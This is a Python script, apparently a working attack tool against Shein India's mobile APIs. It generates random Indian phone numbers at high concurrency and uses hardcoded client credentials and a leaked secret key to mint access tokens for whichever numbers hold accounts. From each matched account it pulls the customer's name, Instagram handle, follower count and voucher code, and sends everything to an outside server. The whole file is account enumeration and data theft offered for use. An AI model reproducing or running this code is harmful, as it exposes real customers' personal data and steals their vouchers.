import asyncio
import aiohttp
import random
import logging
import time
import os
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, Back, Style, init

# --- Colorama Init (Auto Reset) ---
init(autoreset=True)

# --- Configuration ---
SAVE_SERVER_URL = "https://api.fojadomain.fun/save_profile"
SECRET_KEY = os.environ.get("SHEIN_SECRET_KEY", "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg")
PORT = int(os.getenv("PORT", 8080))

# --- SPEED SETTINGS ---
CONCURRENCY = 100  

# Global Variables
CACHED_CLIENT_TOKEN = None
TOKEN_EXPIRY = 0
START_TIME = time.time()

# --- Logging Helpers ---
def log_success(msg):
    """Green Success Message with Line Clear"""
    sys.stdout.write(f"\r{Fore.GREEN}{Style.BRIGHT}[SUCCESS] {msg}{Style.RESET_ALL}\033[K\n")
    sys.stdout.flush()

def log_error(msg):
    """Red Error Message with Line Clear"""
    sys.stdout.write(f"\r{Fore.RED}[ERROR] {msg}{Style.RESET_ALL}\033[K\n")
    sys.stdout.flush()

def log_info(msg):
    """Cyan Info Message with Line Clear"""
    sys.stdout.write(f"\r{Fore.CYAN}[INFO] {msg}{Style.RESET_ALL}\033[K\n")
    sys.stdout.flush()

# --- Health Check Server ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot Running Direct")

def run_health_check():
    server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
    server.serve_forever()

# --- Async Logic ---

class AsyncSheinFetcher:
    def __init__(self):
        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8"
        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        self.profile_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
        
        self.common_headers = {
            'User-Agent': 'Android',
            'X-Tenant-Id': 'SHEIN',
            'X-Tenant': 'B2C',
            'Ad_id': '968777a5-36e1-42a8-9aad-3dc36c3f77b2',
            'Accept-Encoding': 'gzip'
        }

    async def get_valid_client_token(self, session):
        global CACHED_CLIENT_TOKEN, TOKEN_EXPIRY
        current_time = time.time()
        
        if CACHED_CLIENT_TOKEN and current_time < TOKEN_EXPIRY:
            return CACHED_CLIENT_TOKEN
            
        headers = {**self.common_headers, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.sheinindia.in'}
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
        
        try:
            async with session.post(self.client_token_url, headers=headers, data=data, timeout=15) as resp:
                if resp.status == 200:
                    js = await resp.json()
                    token = js.get('access_token') or js.get('data', {}).get('access_token')
                    if token:
                        CACHED_CLIENT_TOKEN = token
                        TOKEN_EXPIRY = current_time + 3000
                        return token
        except Exception:
            pass
        return None

    async def check_account(self, session, phone, client_token):
        headers = {
            **self.common_headers,
            'Authorization': f'Bearer {client_token}',
            'Requestid': 'account_check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'api.sheinindia.in'
        }
        data = f'mobileNumber={phone}'
        try:
            async with session.post(self.account_check_url, headers=headers, data=data, timeout=10) as resp:
                if resp.status == 200:
                    js = await resp.json()
                    if 'encryptedId' in js: return js['encryptedId']
                    if 'data' in js and 'encryptedId' in js['data']: return js['data']['encryptedId']
                    if 'result' in js and 'encryptedId' in js['result']: return js['result']['encryptedId']
        except Exception:
            pass
        return None

    async def get_creator_token_async(self, session, phone, encrypted_id):
        headers = {
            'Content-Type': 'application/json; charset=UTF-8',
            'User-Agent': 'Android',
            'X-Tenant-Id': 'SHEIN',
            'Host': 'shein-creator-backend-151437891745.asia-south1.run.app'
        }
        payload = {
            "client_type": "Android/29", "client_version": "1.0.8", "gender": "male",
            "phone_number": phone, "secret_key": SECRET_KEY,
            "user_id": encrypted_id, "user_name": "CLI_User"
        }
        try:
            async with session.post(self.creator_token_url, json=payload, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    js = await resp.json()
                    return js.get('access_token') or js.get('data', {}).get('access_token')
        except Exception:
            pass
        return None

    async def get_profile(self, session, access_token):
        headers = {'content-type': 'application/json', 'authorization': f'Bearer {access_token}'}
        try:
            async with session.get(self.profile_url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
        except Exception:
            pass
        return None

    async def process_number(self, session, phone, stats):
        try:
            client_token = await self.get_valid_client_token(session)
            if not client_token: return

            encrypted_id = await self.check_account(session, phone, client_token)
            stats['checked'] += 1
            if not encrypted_id: return

            creator_token = await self.get_creator_token_async(session, phone, encrypted_id)
            if not creator_token: return

            profile = await self.get_profile(session, creator_token)
            if profile:
                stats['found'] += 1
                self.handle_success(session, phone, profile)

        except Exception as e:
            pass 

    def handle_success(self, session, phone, data):
        """
        Formats data exactly as requested and sends to server.
        No local saving.
        """
        try:
            if not data or not isinstance(data, dict): return

            # Safe Data Extraction
            ud = data.get('user_data')
            if not ud or not isinstance(ud, dict): ud = {}

            name = ud.get('user_name', 'N/A')

            # Instagram Data & Followers
            insta_data = ud.get('instagram_data')
            if not insta_data or not isinstance(insta_data, dict): insta_data = {}
            
            insta_user = insta_data.get('username', 'N/A')
            # Extract followers count (handle keys safely)
            insta_followers = insta_data.get('followers_count')
            if not insta_followers:
                insta_followers = insta_data.get('follower_count', '0')

            # Voucher Data & Code
            voucher_data = ud.get('voucher_data')
            if not voucher_data or not isinstance(voucher_data, dict): voucher_data = {}
            
            voucher_amount = voucher_data.get('voucher_amount', '0')
            voucher_code = voucher_data.get('voucher_code', 'N/A')
            
            # Log on console
            log_success(f"Phone: {phone} | Rs: {voucher_amount} | Code: {voucher_code}")
            
            # Exact JSON Format Requested
            payload = {
                "phone_number": phone,
                "name": name,
                "insta_user": insta_user,
                "insta_followers": str(insta_followers),
                "voucher_code": voucher_code,
                "voucher_amount_rs": str(voucher_amount),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            # Send to server only
            asyncio.create_task(self.save_remote(session, payload))
                
        except Exception as e:
            pass

    async def save_remote(self, session, payload):
        try:
            await session.post(SAVE_SERVER_URL, json=payload)
        except:
            pass

# --- Generators & Workers ---

def generate_numbers_batch(batch_size=1000):
    return [
        f"{random.choice(['6','7','8','9'])}{''.join(random.choices('0123456789', k=9))}"
        for _ in range(batch_size)
    ]

async def worker(fetcher, session, queue, stats):
    while True:
        phone = await queue.get()
        await fetcher.process_number(session, phone, stats)
        queue.task_done()

async def producer(queue, threshold=5000):
    while True:
        if queue.qsize() < threshold:
            nums = generate_numbers_batch(2000)
            for n in nums:
                queue.put_nowait(n)
            await asyncio.sleep(0.1)
        else:
            await asyncio.sleep(1)

# --- LIVE DASHBOARD ---
async def monitor(stats):
    log_info("Dashboard started... Initializing workers...")
    while True:
        checked = stats['checked']
        found = stats['found']
        elapsed = time.time() - START_TIME
        
        cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
        
        status = (
            f"\r{Fore.YELLOW}[STATUS]{Style.RESET_ALL} "
            f"Checks: {Fore.WHITE}{checked}{Style.RESET_ALL} | "
            f"Found: {Fore.GREEN}{found}{Style.RESET_ALL} | "
            f"Speed: {Fore.MAGENTA}{cpm} CPM{Style.RESET_ALL} | "
            f"Workers: {CONCURRENCY}\033[K"
        )
        
        sys.stdout.write(status)
        sys.stdout.flush()
        
        await asyncio.sleep(0.5)

# --- Main Entry Point ---

async def main():
    fetcher = AsyncSheinFetcher()
    stats = {'checked': 0, 'found': 0}
    queue = asyncio.Queue()
    
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=25)
    
    print("\n" + "="*60)
    log_info(f"STARTING ENGINE (Custom Payload)")
    log_info(f"Workers: {CONCURRENCY} | Local Save: DISABLED")
    print("="*60 + "\n")
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        log_info("Fetching Access Token...")
        token = await fetcher.get_valid_client_token(session)
        if token:
            log_success("Token Validated! Starting check...")
        else:
            log_error("Failed to get Token. Check your internet connection.")
        
        prod_task = asyncio.create_task(producer(queue))
        mon_task = asyncio.create_task(monitor(stats))
        
        workers = [asyncio.create_task(worker(fetcher, session, queue, stats)) for _ in range(CONCURRENCY)]
        
        await asyncio.gather(prod_task, mon_task, *workers)

if __name__ == "__main__":
    threading.Thread(target=run_health_check, daemon=True).start()
    try:
        if os.name == 'nt':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n" + "="*40)
        print(f"{Fore.RED}🛑 Script Stopped.{Style.RESET_ALL}")
        print("="*40)
